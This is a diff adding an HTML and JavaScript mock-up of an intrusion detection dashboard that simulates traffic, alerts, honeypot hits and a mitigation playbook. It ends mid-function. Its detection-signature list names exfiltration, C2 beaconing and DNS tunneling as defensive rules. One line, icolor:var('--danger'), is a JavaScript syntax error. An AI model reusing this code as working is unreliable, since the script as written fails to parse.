@@ -1,0 +1,671 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --nav-w:200px;
+  --font:var(--font-mono,'Courier New',monospace);
+  --accent:#1D9E75;
+  --accent-bg:#E1F5EE;
+  --accent-text:#085041;
+  --danger:#A32D2D;
+  --danger-bg:#FCEBEB;
+  --warn:#854F0B;
+  --warn-bg:#FAEEDA;
+  --info:#185FA5;
+  --info-bg:#E6F1FB;
+}
+body{font-family:var(--font);font-size:13px;}
+.app{display:flex;min-height:700px;}
+.sidebar{width:var(--nav-w);border-right:0.5px solid var(--color-border-tertiary);padding:14px 0;flex-shrink:0;display:flex;flex-direction:column;}
+.brand{padding:0 16px 16px;border-bottom:0.5px solid var(--color-border-tertiary);margin-bottom:8px;}
+.brand-name{font-size:14px;font-weight:500;color:var(--color-text-primary);}
+.brand-sub{font-size:10px;color:var(--color-text-secondary);letter-spacing:0.05em;}
+.nav-section{font-size:9px;font-weight:500;color:var(--color-text-secondary);letter-spacing:0.1em;padding:12px 16px 4px;text-transform:uppercase;}
+.nav-item{display:flex;align-items:center;gap:8px;padding:7px 16px;cursor:pointer;font-size:12px;color:var(--color-text-secondary);border-left:2px solid transparent;transition:all .15s;}
+.nav-item:hover{background:var(--color-background-secondary);color:var(--color-text-primary);}
+.nav-item.active{color:var(--accent-text);background:var(--accent-bg);border-left-color:var(--accent);}
+.nav-item i{font-size:15px;width:18px;}
+.nav-badge{margin-left:auto;font-size:10px;background:var(--danger-bg);color:var(--danger);padding:1px 6px;border-radius:10px;}
+.main{flex:1;min-width:0;display:flex;flex-direction:column;}
+.topbar{display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:0.5px solid var(--color-border-tertiary);}
+.page-title{font-size:14px;font-weight:500;color:var(--color-text-primary);}
+.live-pill{display:flex;align-items:center;gap:5px;font-size:10px;color:var(--accent-text);background:var(--accent-bg);padding:3px 9px;border-radius:20px;}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--accent);animation:pulse 1.4s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.tb-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
+.content{flex:1;overflow-y:auto;padding:16px;}
+.page{display:none;}
+.page.active{display:block;}
+
+.metrics{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-bottom:16px;}
+.metric{background:var(--color-background-secondary);border-radius:8px;padding:10px 12px;}
+.metric-label{font-size:10px;color:var(--color-text-secondary);letter-spacing:.04em;text-transform:uppercase;margin-bottom:3px;}
+.metric-value{font-size:20px;font-weight:500;}
+.metric-sub{font-size:10px;color:var(--color-text-secondary);margin-top:2px;}
+
+.grid2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px;margin-bottom:12px;}
+.grid3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px;margin-bottom:12px;}
+.card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:10px;padding:14px;}
+.card-title{font-size:11px;font-weight:500;color:var(--color-text-secondary);letter-spacing:.06em;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+.card-title i{font-size:14px;}
+.full{grid-column:1/-1;}
+
+.alert-row{display:flex;align-items:flex-start;gap:8px;padding:8px 10px;border-radius:8px;border:0.5px solid var(--color-border-tertiary);margin-bottom:6px;font-size:12px;animation:fadeIn .3s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.alert-row.critical{background:var(--danger-bg);border-color:#F09595;}
+.alert-row.high{background:var(--warn-bg);border-color:#FAC775;}
+.alert-row.medium{background:var(--info-bg);border-color:#85B7EB;}
+.alert-row.low{background:#EAF3DE;border-color:#97C459;}
+.sev{font-size:10px;padding:1px 7px;border-radius:10px;font-weight:500;flex-shrink:0;}
+.sev.critical{background:#F7C1C1;color:#791F1F;}
+.sev.high{background:#FAC775;color:#412402;}
+.sev.medium{background:#B5D4F4;color:#042C53;}
+.sev.low{background:#C0DD97;color:#173404;}
+
+tbl,table{width:100%;border-collapse:collapse;font-size:12px;}
+th{text-align:left;padding:6px 8px;font-size:10px;font-weight:500;color:var(--color-text-secondary);letter-spacing:.04em;text-transform:uppercase;border-bottom:0.5px solid var(--color-border-tertiary);}
+td{padding:6px 8px;border-bottom:0.5px solid var(--color-border-tertiary);color:var(--color-text-primary);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--color-background-secondary);}
+.tag{display:inline-block;padding:1px 7px;border-radius:10px;font-size:10px;font-weight:500;}
+.tag.green{background:#EAF3DE;color:#27500A;}
+.tag.red{background:var(--danger-bg);color:var(--danger);}
+.tag.amber{background:var(--warn-bg);color:var(--warn);}
+.tag.blue{background:var(--info-bg);color:var(--info);}
+.tag.gray{background:#F1EFE8;color:#5F5E5A;}
+
+.ai-box{background:var(--color-background-secondary);border-radius:8px;padding:14px;font-size:12px;line-height:1.7;color:var(--color-text-primary);min-height:60px;white-space:pre-wrap;}
+.ai-thinking{display:flex;align-items:center;gap:8px;color:var(--color-text-secondary);font-size:12px;}
+.dots span{animation:dot 1.2s infinite;display:inline-block;}
+.dots span:nth-child(2){animation-delay:.2s}.dots span:nth-child(3){animation-delay:.4s}
+@keyframes dot{0%,80%,100%{opacity:.2}40%{opacity:1}}
+
+.spark-wrap{position:relative;height:80px;margin-bottom:4px;}
+.proto-row{display:flex;align-items:center;gap:6px;margin-bottom:6px;font-size:11px;}
+.bar-bg{flex:1;height:6px;background:var(--color-background-secondary);border-radius:3px;overflow:hidden;}
+.bar-fill{height:100%;border-radius:3px;transition:width .5s;}
+.proto-name{width:44px;color:var(--color-text-secondary);}
+.proto-pct{width:30px;text-align:right;color:var(--color-text-secondary);}
+
+.honeypot-card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:10px;padding:12px;margin-bottom:8px;}
+.hp-header{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
+.hp-status{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.hp-status.active{background:var(--accent);animation:pulse 1.4s infinite;}
+.hp-status.alert{background:#E24B4A;animation:pulse .7s infinite;}
+.hp-name{font-weight:500;font-size:13px;color:var(--color-text-primary);}
+.hp-type{font-size:10px;color:var(--color-text-secondary);margin-left:auto;}
+.hp-metrics{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;}
+.hp-m{text-align:center;}
+.hp-m-v{font-size:16px;font-weight:500;color:var(--color-text-primary);}
+.hp-m-l{font-size:10px;color:var(--color-text-secondary);}
+
+.db-schema{display:flex;flex-direction:column;gap:10px;}
+.schema-table{border:0.5px solid var(--color-border-tertiary);border-radius:8px;overflow:hidden;}
+.schema-header{background:var(--color-background-secondary);padding:8px 12px;font-size:11px;font-weight:500;color:var(--color-text-primary);display:flex;align-items:center;gap:6px;}
+.schema-header i{font-size:14px;color:var(--color-text-secondary);}
+.schema-fields{font-size:11px;}
+.schema-field{display:flex;align-items:center;gap:8px;padding:5px 12px;border-bottom:0.5px solid var(--color-border-tertiary);}
+.schema-field:last-child{border-bottom:none;}
+.field-name{color:var(--color-text-primary);font-weight:500;width:130px;}
+.field-type{color:var(--info);width:90px;}
+.field-desc{color:var(--color-text-secondary);}
+.pk{font-size:9px;background:var(--accent-bg);color:var(--accent-text);padding:1px 5px;border-radius:4px;flex-shrink:0;}
+.fk{font-size:9px;background:var(--info-bg);color:var(--info);padding:1px 5px;border-radius:4px;flex-shrink:0;}
+
+.case-card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:10px;padding:14px;margin-bottom:10px;}
+.case-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;}
+.case-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.case-icon i{font-size:18px;}
+.case-title{font-size:14px;font-weight:500;color:var(--color-text-primary);}
+.case-meta{font-size:11px;color:var(--color-text-secondary);margin-top:2px;}
+.timeline{border-left:2px solid var(--color-border-tertiary);padding-left:14px;margin-top:10px;}
+.t-step{margin-bottom:10px;position:relative;}
+.t-step::before{content:'';position:absolute;left:-19px;top:4px;width:8px;height:8px;border-radius:50%;background:var(--color-border-tertiary);border:2px solid var(--color-background-primary);}
+.t-step.done::before{background:var(--accent);}
+.t-step.warn::before{background:#E24B4A;}
+.t-time{font-size:10px;color:var(--color-text-secondary);}
+.t-text{font-size:12px;color:var(--color-text-primary);}
+
+.mitig-row{display:flex;gap:10px;align-items:flex-start;padding:10px 0;border-bottom:0.5px solid var(--color-border-tertiary);}
+.mitig-row:last-child{border-bottom:none;}
+.mitig-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.mitig-icon i{font-size:16px;}
+.mitig-title{font-size:13px;font-weight:500;color:var(--color-text-primary);}
+.mitig-desc{font-size:11px;color:var(--color-text-secondary);line-height:1.5;margin-top:2px;}
+.priority{font-size:9px;padding:2px 7px;border-radius:10px;font-weight:500;margin-left:8px;}
+
+.btn-group{display:flex;gap:6px;flex-wrap:wrap;}
+button{font-size:12px;}
+select{font-size:12px;}
+input[type=text]{font-size:12px;padding:5px 10px;border:0.5px solid var(--color-border-secondary);border-radius:6px;background:var(--color-background-primary);color:var(--color-text-primary);width:200px;}
+
+.arch-layer{border:0.5px solid var(--color-border-tertiary);border-radius:8px;padding:10px 14px;margin-bottom:8px;}
+.arch-layer-title{font-size:10px;font-weight:500;color:var(--color-text-secondary);letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px;}
+.arch-modules{display:flex;gap:6px;flex-wrap:wrap;}
+.arch-mod{background:var(--color-background-secondary);border-radius:6px;padding:5px 10px;font-size:11px;color:var(--color-text-primary);border:0.5px solid var(--color-border-tertiary);}
+.arch-mod.highlight{background:var(--accent-bg);color:var(--accent-text);border-color:#5DCAA5;}
+.arch-arrow{text-align:center;color:var(--color-text-secondary);font-size:14px;margin:2px 0;}
+</style>
+
+<h2 class="sr-only">NetGuard IDS platform with live traffic, database schema, honeypots, mitigations, and case studies.</h2>
+
+<div class="app">
+  <div class="sidebar">
+    <div class="brand">
+      <div class="brand-name"><i class="ti ti-shield-lock" style="color:var(--accent)" aria-hidden="true"></i> NetGuard IDS</div>
+      <div class="brand-sub">v2.0 · Modular Architecture</div>
+    </div>
+    <div class="nav-section">Monitor</div>
+    <div class="nav-item active" onclick="nav('dashboard')"><i class="ti ti-layout-dashboard" aria-hidden="true"></i> Dashboard</div>
+    <div class="nav-item" onclick="nav('alerts')"><i class="ti ti-alert-triangle" aria-hidden="true"></i> Alerts <span class="nav-badge" id="nb">0</span></div>
+    <div class="nav-item" onclick="nav('connections')"><i class="ti ti-network" aria-hidden="true"></i> Connections</div>
+    <div class="nav-section">Defence</div>
+    <div class="nav-item" onclick="nav('honeypots')"><i class="ti ti-bug" aria-hidden="true"></i> Honeypots</div>
+    <div class="nav-item" onclick="nav('mitigations')"><i class="ti ti-shield-check" aria-hidden="true"></i> Mitigations</div>
+    <div class="nav-section">Forensics</div>
+    <div class="nav-item" onclick="nav('database')"><i class="ti ti-database" aria-hidden="true"></i> Database</div>
+    <div class="nav-item" onclick="nav('casestudy')"><i class="ti ti-book" aria-hidden="true"></i> Case Studies</div>
+    <div class="nav-section">Intelligence</div>
+    <div class="nav-item" onclick="nav('architecture')"><i class="ti ti-hierarchy" aria-hidden="true"></i> Architecture</div>
+    <div class="nav-item" onclick="nav('ai')"><i class="ti ti-brain" aria-hidden="true"></i> AI Analyst</div>
+  </div>
+
+  <div class="main">
+    <div class="topbar">
+      <span class="page-title" id="ptitle">Dashboard</span>
+      <div class="live-pill"><div class="dot"></div>Live</div>
+      <div class="tb-right">
+        <select id="ifaceSelect" style="font-size:12px;padding:4px 8px;border:0.5px solid var(--color-border-secondary);border-radius:6px;background:var(--color-background-primary);color:var(--color-text-primary);">
+          <option>eth0 — 192.168.1.0/24</option>
+          <option>wlan0 — 10.0.0.0/24</option>
+          <option>tap0 — honeypot-net</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="content">
+
+      <div class="page active" id="page-dashboard">
+        <div class="metrics">
+          <div class="metric"><div class="metric-label">Packets/sec</div><div class="metric-value" id="m-pps" style="color:var(--color-text-primary)">0</div><div class="metric-sub" id="m-bps">0 MB/s</div></div>
+          <div class="metric"><div class="metric-label">Threats</div><div class="metric-value" id="m-thr" style="color:var(--accent)">0</div><div class="metric-sub" id="m-blk">0 blocked</div></div>
+          <div class="metric"><div class="metric-label">Honeypot hits</div><div class="metric-value" id="m-hp" style="color:var(--warn)">0</div><div class="metric-sub">across 4 traps</div></div>
+          <div class="metric"><div class="metric-label">Threat level</div><div class="metric-value" id="m-lvl" style="color:var(--accent)">LOW</div><div class="metric-sub" id="m-lvl-sub">Normal ops</div></div>
+        </div>
+        <div class="grid2">
+          <div class="card"><div class="card-title"><i class="ti ti-activity" aria-hidden="true"></i>Traffic (30s)</div><div class="spark-wrap"><canvas id="spark" role="img" aria-label="Traffic sparkline over 30 seconds"></canvas></div></div>
+          <div class="card"><div class="card-title"><i class="ti ti-layers-difference" aria-hidden="true"></i>Protocols</div><div id="protoList"></div></div>
+        </div>
+        <div class="card"><div class="card-title"><i class="ti ti-alert-triangle" aria-hidden="true"></i>Recent alerts</div><div id="recentAlerts"></div></div>
+      </div>
+
+      <div class="page" id="page-alerts">
+        <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap;">
+          <select id="sevFilter" onchange="renderAlertPage()" style="font-size:12px;padding:5px 8px;border:0.5px solid var(--color-border-secondary);border-radius:6px;background:var(--color-background-primary);color:var(--color-text-primary);">
+            <option value="all">All severities</option>
+            <option value="critical">Critical</option>
+            <option value="high">High</option>
+            <option value="medium">Medium</option>
+            <option value="low">Low</option>
+          </select>
+          <input type="text" id="ipFilter" placeholder="Filter by IP…" oninput="renderAlertPage()">
+          <button onclick="DB.alerts=[];renderAlertPage();updateMetrics();" style="margin-left:auto;"><i class="ti ti-trash" aria-hidden="true"></i> Clear</button>
+        </div>
+        <div id="alertPage"></div>
+      </div>
+
+      <div class="page" id="page-connections">
+        <div style="margin-bottom:12px;">
+          <button onclick="genConnections()"><i class="ti ti-refresh" aria-hidden="true"></i> Refresh</button>
+        </div>
+        <div class="card">
+          <table>
+            <thead><tr><th>Src IP</th><th>Dst IP</th><th>Port</th><th>Proto</th><th>Pkts</th><th>Bytes</th><th>Duration</th><th>Status</th></tr></thead>
+            <tbody id="connBody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="page" id="page-honeypots">
+        <div class="grid2" style="margin-bottom:12px;">
+          <div class="metric"><div class="metric-label">Active traps</div><div class="metric-value" style="color:var(--accent)">4</div><div class="metric-sub">2 SSH · 1 HTTP · 1 DB</div></div>
+          <div class="metric"><div class="metric-label">Total interactions</div><div class="metric-value" id="hp-total" style="color:var(--color-text-primary)">0</div><div class="metric-sub">unique attacker IPs</div></div>
+        </div>
+        <div id="honeypotList"></div>
+        <div class="card" style="margin-top:12px;">
+          <div class="card-title"><i class="ti ti-clock-record" aria-hidden="true"></i>Honeypot interaction log</div>
+          <div id="hpLog" style="max-height:220px;overflow-y:auto;"></div>
+        </div>
+      </div>
+
+      <div class="page" id="page-mitigations">
+        <div class="card" style="margin-bottom:12px;">
+          <div class="card-title"><i class="ti ti-brain" aria-hidden="true"></i>AI-generated mitigation plan</div>
+          <div class="ai-box" id="mitig-ai">Click "Generate plan" to get AI-tailored mitigations based on current active threats.</div>
+          <div style="margin-top:10px;"><button onclick="genMitigPlan()"><i class="ti ti-brain" aria-hidden="true"></i> Generate plan ↗</button></div>
+        </div>
+        <div class="card">
+          <div class="card-title"><i class="ti ti-shield-check" aria-hidden="true"></i>Standard mitigation playbook</div>
+          <div id="mitigList"></div>
+        </div>
+      </div>
+
+      <div class="page" id="page-database">
+        <div class="card" style="margin-bottom:12px;">
+          <div class="card-title"><i class="ti ti-database" aria-hidden="true"></i>In-memory database — current session</div>
+          <div class="grid3">
+            <div class="metric"><div class="metric-label">Alerts stored</div><div class="metric-value" id="db-alerts" style="color:var(--color-text-primary)">0</div></div>
+            <div class="metric"><div class="metric-label">Connections</div><div class="metric-value" id="db-conns" style="color:var(--color-text-primary)">0</div></div>
+            <div class="metric"><div class="metric-label">Honeypot events</div><div class="metric-value" id="db-hp" style="color:var(--color-text-primary)">0</div></div>
+          </div>
+        </div>
+        <div class="card" style="margin-bottom:12px;">
+          <div class="card-title"><i class="ti ti-table" aria-hidden="true"></i>Schema — alerts table</div>
+          <div class="schema-fields" id="schema-alerts"></div>
+        </div>
+        <div class="card" style="margin-bottom:12px;">
+          <div class="card-title"><i class="ti ti-table" aria-hidden="true"></i>Schema — connections table</div>
+          <div class="schema-fields" id="schema-conn"></div>
+        </div>
+        <div class="card">
+          <div class="card-title"><i class="ti ti-table" aria-hidden="true"></i>Schema — honeypot_events table</div>
+          <div class="schema-fields" id="schema-hp"></div>
+        </div>
+      </div>
+
+      <div class="page" id="page-casestudy">
+        <div id="caseList"></div>
+      </div>
+
+      <div class="page" id="page-architecture">
+        <div class="card">
+          <div class="card-title"><i class="ti ti-hierarchy" aria-hidden="true"></i>Modular architecture — each layer is frontend-agnostic</div>
+          <div class="arch-layer">
+            <div class="arch-layer-title">Frontend layer (swappable — any UI framework)</div>
+            <div class="arch-modules">
+              <div class="arch-mod highlight">React dashboard</div>
+              <div class="arch-mod highlight">Vue dashboard</div>
+              <div class="arch-mod highlight">Angular app</div>
+              <div class="arch-mod highlight">CLI / terminal</div>
+              <div class="arch-mod highlight">Mobile app</div>
+            </div>
+          </div>
+          <div class="arch-arrow">↕ REST API / WebSocket / Event Bus</div>
+          <div class="arch-layer">
+            <div class="arch-layer-title">Service bus — EventBus.js (pub/sub, frontend-independent)</div>
+            <div class="arch-modules">
+              <div class="arch-mod">subscribe(topic, cb)</div>
+              <div class="arch-mod">publish(topic, data)</div>
+              <div class="arch-mod">unsubscribe(id)</div>
+              <div class="arch-mod">replay(topic)</div>
+            </div>
+          </div>
+          <div class="arch-arrow">↕</div>
+          <div class="arch-layer">
+            <div class="arch-layer-title">Engine layer — core services (zero UI dependency)</div>
+            <div class="arch-modules">
+              <div class="arch-mod">TrafficEngine.js</div>
+              <div class="arch-mod">IDSEngine.js</div>
+              <div class="arch-mod">HoneypotManager.js</div>
+              <div class="arch-mod">ThreatDB.js</div>
+              <div class="arch-mod">MitigationEngine.js</div>
+              <div class="arch-mod">AIAnalyst.js</div>
+            </div>
+          </div>
+          <div class="arch-arrow">↕</div>
+          <div class="arch-layer">
+            <div class="arch-layer-title">Data layer — database adapters (swap without touching engines)</div>
+            <div class="arch-modules">
+              <div class="arch-mod">SQLiteAdapter</div>
+              <div class="arch-mod">PostgresAdapter</div>
+              <div class="arch-mod">MongoAdapter</div>
+              <div class="arch-mod">InMemoryAdapter</div>
+            </div>
+          </div>
+        </div>
+        <div style="margin-top:10px;">
+          <button onclick="sendPrompt('Show me the full code for the EventBus service bus and how to swap the frontend from React to Vue without touching the IDS engine.')">How to swap frontend ↗</button>
+          <button onclick="sendPrompt('Give me the full IDSEngine.js and ThreatDB.js module code with database adapter pattern.')" style="margin-left:6px;">Engine code ↗</button>
+        </div>
+      </div>
+
+      <div class="page" id="page-ai">
+        <div class="grid2" style="margin-bottom:12px;">
+          <div class="card">
+            <div class="card-title"><i class="ti ti-brain" aria-hidden="true"></i>AI threat analyst</div>
+            <div class="ai-box" id="ai-main">Click "Analyse now" to run a full AI assessment of current network state, detected threats, and honeypot intelligence.</div>
+            <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
+              <button onclick="aiAnalyse()"><i class="ti ti-brain" aria-hidden="true"></i> Analyse now ↗</button>
+              <button onclick="sendPrompt('Explain the kill chain for the threats currently detected in the IDS, including MITRE ATT&CK mapping.')">MITRE ATT&CK ↗</button>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-title"><i class="ti ti-chart-bar" aria-hidden="true"></i>Threat distribution</div>
+            <div style="position:relative;height:160px;"><canvas id="sevChart" role="img" aria-label="Bar chart showing threat counts by severity"></canvas></div>
+            <div style="display:flex;gap:12px;margin-top:8px;font-size:11px;flex-wrap:wrap;" id="sevLegend"></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-title"><i class="ti ti-list" aria-hidden="true"></i>AI-readable event log (JSON feed)</div>
+          <div style="background:var(--color-background-secondary);border-radius:8px;padding:10px;font-size:11px;font-family:var(--font-mono,'monospace');max-height:200px;overflow-y:auto;color:var(--color-text-primary);" id="jsonFeed"></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js"></script>
+<script>
+const PAGES = {dashboard:'Dashboard',alerts:'Alerts',connections:'Connections',honeypots:'Honeypots',mitigations:'Mitigations',database:'Database Schema',casestudy:'Case Studies',architecture:'Architecture',ai:'AI Analyst'};
+
+const DB = {
+  alerts: [],
+  connections: [],
+  hp_events: [],
+  totalPkts: 0,
+  hpHits: 0,
+  blocked: 0,
+};
+
+const SCHEMA_ALERTS = [
+  {name:'id',type:'UUID',pk:true,desc:'Primary key'},
+  {name:'timestamp',type:'TIMESTAMP',desc:'Detection time (UTC)'},
+  {name:'threat_type',type:'VARCHAR(64)',desc:'IDS rule name'},
+  {name:'severity',type:'ENUM',desc:'critical/high/medium/low'},
+  {name:'src_ip',type:'INET',desc:'Source IP address'},
+  {name:'dst_ip',type:'INET',desc:'Destination IP address'},
+  {name:'src_port',type:'INTEGER',desc:'Source port'},
+  {name:'dst_port',type:'INTEGER',desc:'Destination port'},
+  {name:'protocol',type:'VARCHAR(10)',desc:'TCP/UDP/ICMP'},
+  {name:'payload_hash',type:'VARCHAR(64)',desc:'SHA-256 of packet payload'},
+  {name:'mitigated',type:'BOOLEAN',desc:'Action taken flag'},
+  {name:'session_id',type:'UUID',fk:true,desc:'→ connections.id'},
+];
+const SCHEMA_CONN = [
+  {name:'id',type:'UUID',pk:true,desc:'Primary key'},
+  {name:'started_at',type:'TIMESTAMP',desc:'Connection start'},
+  {name:'ended_at',type:'TIMESTAMP',desc:'Connection end (null if active)'},
+  {name:'src_ip',type:'INET',desc:'Source IP'},
+  {name:'dst_ip',type:'INET',desc:'Destination IP'},
+  {name:'dst_port',type:'INTEGER',desc:'Destination port'},
+  {name:'protocol',type:'VARCHAR(10)',desc:'Transport protocol'},
+  {name:'packets',type:'BIGINT',desc:'Total packets exchanged'},
+  {name:'bytes',type:'BIGINT',desc:'Total bytes transferred'},
+  {name:'is_suspicious',type:'BOOLEAN',desc:'Flagged by IDS'},
+  {name:'geo_country',type:'VARCHAR(3)',desc:'ISO country code (src)'},
+];
+const SCHEMA_HP = [
+  {name:'id',type:'UUID',pk:true,desc:'Primary key'},
+  {name:'timestamp',type:'TIMESTAMP',desc:'Event time'},
+  {name:'honeypot_id',type:'VARCHAR(32)',fk:true,desc:'→ honeypots.id'},
+  {name:'attacker_ip',type:'INET',desc:'Attacker source IP'},
+  {name:'action',type:'VARCHAR(64)',desc:'login_attempt/scan/payload'},
+  {name:'credential_used',type:'TEXT',desc:'Username:password tried'},
+  {name:'payload',type:'TEXT',desc:'Command or payload body'},
+  {name:'session_duration',type:'INTEGER',desc:'Seconds spent in honeypot'},
+];
+
+const THREATS = [
+  {name:'Port Scan',sev:'high',icon:'ti-scan',sig:'SYN_SCAN_RULE_001'},
+  {name:'SQL Injection',sev:'critical',icon:'ti-code',sig:'SQLI_HTTP_RULE_007'},
+  {name:'Brute Force SSH',sev:'high',icon:'ti-lock-open',sig:'BF_SSH_RULE_003'},
+  {name:'DNS Tunneling',sev:'medium',icon:'ti-topology-star-3',sig:'DNS_EXFIL_RULE_012'},
+  {name:'DDoS Flood',sev:'critical',icon:'ti-wave-saw-tool',sig:'DDOS_UDP_RULE_005'},
+  {name:'ARP Spoofing',sev:'high',icon:'ti-router',sig:'ARP_SPOOF_RULE_009'},
+  {name:'Malware C2',sev:'critical',icon:'ti-bug',sig:'C2_BEACON_RULE_021'},
+  {name:'Lateral Movement',sev:'high',icon:'ti-arrows-horizontal',sig:'LAT_MOV_RULE_018'},
+  {name:'ICMP Flood',sev:'medium',icon:'ti-wave-sine',sig:'ICMP_RULE_004'},
+  {name:'Data Exfil',sev:'critical',icon:'ti-cloud-upload',sig:'EXFIL_RULE_031'},
+  {name:'Reconnaissance',sev:'low',icon:'ti-eye',sig:'RECON_RULE_002'},
+  {name:'Crypto Miner',sev:'medium',icon:'ti-cpu',sig:'MINER_RULE_044'},
+];
+
+const IPS = ['192.168.1.104','10.0.0.55','172.16.0.23','203.0.113.47','198.51.100.88','192.168.2.201','45.33.32.156','185.220.101.33','10.0.0.12','45.142.212.100'];
+const DSTS = ['192.168.1.1','8.8.8.8','10.0.0.1','172.16.0.1','185.220.101.x'];
+const PORTS = [80,443,22,53,3306,8080,4444,445,21,3389];
+const PROTOS = [{name:'HTTP',color:'#378ADD',base:35},{name:'HTTPS',color:'#1D9E75',base:40},{name:'DNS',color:'#EF9F27',base:12},{name:'SSH',color:'#D4537E',base:5},{name:'Other',color:'#888780',base:8}];
+
+const HONEYPOTS = [
+  {id:'hp-ssh-01',name:'SSH Honeypot Alpha',type:'Low-interaction SSH',ip:'10.0.0.200',port:22,hits:0,creds:[]},
+  {id:'hp-ssh-02',name:'SSH Honeypot Beta',type:'High-interaction SSH',ip:'10.0.0.201',port:22,hits:0,creds:[]},
+  {id:'hp-http-01',name:'Fake Admin Panel',type:'HTTP/Web trap',ip:'10.0.0.202',port:80,hits:0,creds:[]},
+  {id:'hp-db-01',name:'MySQL Decoy DB',type:'Database honeypot',ip:'10.0.0.203',port:3306,hits:0,creds:[]},
+];
+
+const MITIGATIONS = [
+  {icon:'ti-ban',color:'#FCEBEB',icolor:var('--danger'),'title':'Block attacker IP','desc':'Auto-add source IPs to firewall deny list via iptables/nftables. Rate: immediate for critical, 5-min threshold for high.','priority':'critical','ptag':'red'},
+  {icon:'ti-refresh',color:'#FAEEDA',icolor:'#854F0B','title':'Rate limiting','desc':'Apply per-IP rate limits at the edge: max 100 req/s HTTP, 10 auth/min SSH. Drop excess via tc-netem.','priority':'high','ptag':'amber'},
+  {icon:'ti-shield-lock',color:'#E1F5EE',icolor:'#0F6E56','title':'Segment & isolate','desc':'Move suspected hosts to quarantine VLAN. Disable lateral SMB/RDP. Cut external routing until forensic review.','priority':'high','ptag':'amber'},
+  {icon:'ti-lock',color:'#E6F1FB',icolor:'#185FA5','title':'Force MFA re-auth','desc':'Revoke active sessions for accounts under brute-force. Require TOTP re-authentication before new session.','priority':'medium','ptag':'blue'},
+  {icon:'ti-eye',color:'#EAF3DE',icolor:'#3B6D11','title':'Deep packet inspection','desc':'Route suspicious flows through Suricata DPI. Extract and hash payloads, cross-reference with VirusTotal API.','priority':'medium','ptag':'blue'},
+  {icon:'ti-bug',color:'#FAEEDA',icolor:'#854F0B','title':'Honeypot redirect','desc':'Re-route scanners and brute-force sources to honeypot sinkhole. Capture credentials and TTPs for intelligence.','priority':'medium','ptag':'amber'},
+  {icon:'ti-mail',color:'#F1EFE8',icolor:'#5F5E5A','title':'Incident notification','desc':'Auto-generate SIEM ticket. Alert SOC via PagerDuty/Slack. Escalate critical to on-call within 5 minutes.','priority':'low','ptag':'gray'},
+];
+
+function pick(arr){return arr[Math.floor(Math.random()*arr.length)];}
+function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
+function uid(){return Math.random().toString(36).slice(2,10);}
+function now(){return new Date().toTimeString().split(' ')[0];}
+
+function nav(id){
+  document.querySelectorAll('.nav-item').forEach(el=>el.classList.remove('active'));
+  document.querySelectorAll('.page').forEach(el=>el.classList.remove('active'));
+  document.querySelector(`[onclick="nav('${id}')"]`).classList.add('active');
+  document.getElementById('page-'+id).classList.add('active');
+  document.getElementById('ptitle').textContent = PAGES[id];
+  if(id==='database')renderDB();
+  if(id==='alerts')renderAlertPage();
+  if(id==='connections')genConnections();
+  if(id==='honeypots')renderHoneypots();
+  if(id==='casestudy')renderCases();
+  if(id==='mitigations')renderMitigList();
+  if(id==='ai')renderAIPage();
+}
+
+let sparkData=new Array(30).fill(0), sparkChart, sevChart;
+
+function initSpark(){
+  const ctx=document.getElementById('spark').getContext('2d');
+  sparkChart=new Chart(ctx,{type:'line',data:{labels:sparkData.map((_,i)=>i),datasets:[{data:sparkData,borderColor:'#1D9E75',borderWidth:2,pointRadius:0,fill:true,backgroundColor:'rgba(29,158,117,0.08)',tension:0.4}]},options:{responsive:true,maintainAspectRatio:false,animation:false,plugins:{legend:{display:false}},scales:{x:{display:false},y:{display:false,beginAtZero:true}}}});
+}
+
+function initSevChart(){
+  const ctx=document.getElementById('sevChart');
+  if(!ctx)return;
+  if(sevChart)sevChart.destroy();
+  const counts={critical:0,high:0,medium:0,low:0};
+  DB.alerts.forEach(a=>counts[a.sev]=(counts[a.sev]||0)+1);
+  const labels=['Critical','High','Medium','Low'];
+  const colors=['#E24B4A','#EF9F27','#378ADD','#639922'];
+  sevChart=new Chart(ctx,{type:'bar',data:{labels,datasets:[{data:[counts.critical,counts.high,counts.medium,counts.low],backgroundColor:colors,borderRadius:4,borderSkipped:false}]},options:{responsive:true,maintainAspectRatio:false,animation:false,plugins:{legend:{display:false}},scales:{x:{grid:{display:false},ticks:{font:{size:11}}},y:{grid:{color:'rgba(128,128,128,0.1)'},ticks:{stepSize:1,font:{size:11}},beginAtZero:true}}}});
+  const leg=document.getElementById('sevLegend');
